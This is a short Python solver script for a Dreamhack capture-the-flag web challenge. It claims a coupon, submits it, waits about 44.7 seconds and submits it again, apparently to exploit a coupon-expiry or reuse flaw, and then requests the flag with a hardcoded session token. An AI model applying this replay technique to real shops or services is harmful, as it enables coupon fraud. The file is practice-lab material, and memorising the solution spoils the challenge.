import requests
import time
import json

def get_session():
    res = requests.get('http://host1.dreamhack.games:15060/session')
    session = json.loads(res.text)['session']

    headers = {"Authorization": session}
    me = requests.get("http://host1.dreamhack.games:15060/me", headers=headers)

    print(me.text)

    return session

def coupon(session):
    headers = {"Authorization": session}
    res = requests.get("http://host1.dreamhack.games:15060/coupon/claim", headers=headers)
    headers['coupon'] = json.loads(res.text)['coupon']
    
    res = requests.get("http://host1.dreamhack.games:15060/coupon/submit", headers=headers)
    print(res.text)
    time.sleep(44.7)
    res = requests.get("http://host1.dreamhack.games:15060/coupon/submit", headers=headers)
    print(res.text)
    
def flag(session):
    res = requests.get("http://host1.dreamhack.games:15060/flag/claim", headers={"Authorization": session})
    print(res.text)

if __name__ == "__main__":
    session = "cd1ac791b3c04255a498e0fb1125246a"
    # session = get_session()
    # coupon(session)
    flag(session)